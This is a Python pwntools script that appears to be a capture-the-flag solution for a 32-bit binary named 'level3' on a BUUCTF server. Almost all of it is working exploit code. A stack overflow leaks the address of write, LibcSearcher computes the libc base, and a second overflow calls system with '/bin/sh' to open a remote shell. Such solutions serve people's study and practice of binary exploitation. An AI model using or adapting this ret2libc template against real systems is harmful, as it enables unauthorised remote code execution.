#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'level3'
remote_addr = 'node5.buuoj.cn'
port = 25756

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    main = elf.symbols['main']
    payload = b'a'*0x88 + b'b'*4 + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
    p.sendafter(b'Input:\n',payload)
    write_addr = u32(p.recv(4))
    log.success('write_addr--> '+ hex(write_addr))
    libc = LibcSearcher('write',write_addr)
    libc_base = write_addr - libc.dump('write')
    system = libc_base + libc.dump('system')
    bin_sh = libc_base + libc.dump('str_bin_sh')
    payload = b'a'*0x88 + b'b'*4 + p32(system) + p32(0) + p32(bin_sh)
    p.sendafter(b'Input:\n',payload)
    p.interactive()
